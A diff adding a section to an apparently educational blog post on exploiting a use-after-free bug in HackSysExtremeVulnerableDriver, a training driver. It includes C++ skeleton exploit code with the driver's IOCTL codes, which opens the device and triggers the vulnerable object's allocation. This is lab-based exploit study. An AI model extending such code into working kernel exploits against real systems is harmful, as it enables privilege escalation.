@@ -48,3 +48,65 @@ What do we need in order to exploit a use-after-free bug? Well, it seems like af
 ## Allocating the UAF Object in the Pool
 Let's take a look at the UAF object allocation routine in the driver in IDA. 
 ![](/assets/images/AWE/uaf1.PNG)
+
+It may not be immediately clear what's going on without stepping through the routine in the debugger but we actually have very little control over what is taking place here. I've created a small skeleton exploit code and set a breakpoint towards the start of the routine. Here is our code at the moment:
+```cpp
+#include <iostream>
+#include <Windows.h>
+
+using namespace std;
+
+#define DEVICE_NAME             "\\\\.\\HackSysExtremeVulnerableDriver"
+#define ALLOCATE_UAF_IOCTL      0x222013
+#define FREE_UAF_IOCTL          0x22201B
+#define FAKE_OBJECT_IOCTL       0x22201F
+#define USE_UAF_IOCTL           0x222017
+
+HANDLE grab_handle() {
+
+    HANDLE hFile = CreateFileA(DEVICE_NAME,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        cout << "[!] No handle to HackSysExtremeVulnerableDriver\n";
+        exit(1);
+    }
+
+    cout << "[>] Grabbed handle to HackSysExtremeVulnerableDriver: " << hex
+        << hFile << "\n";
+
+    return hFile;
+}
+
+void create_UAF_object(HANDLE hFile) {
+
+    BYTE input_buffer[] = "\x00";
+
+    DWORD bytes_ret = 0x0;
+
+    int result = DeviceIoControl(hFile,
+        ALLOCATE_UAF_IOCTL,
+        input_buffer,
+        sizeof(input_buffer),
+        NULL,
+        0,
+        &bytes_ret,
+        NULL);
+}
+
+
+int main() {
+
+    HANDLE hFile = grab_handle();
+
+    create_UAF_object(hFile);
+
+    return 0;
+}
+```
+
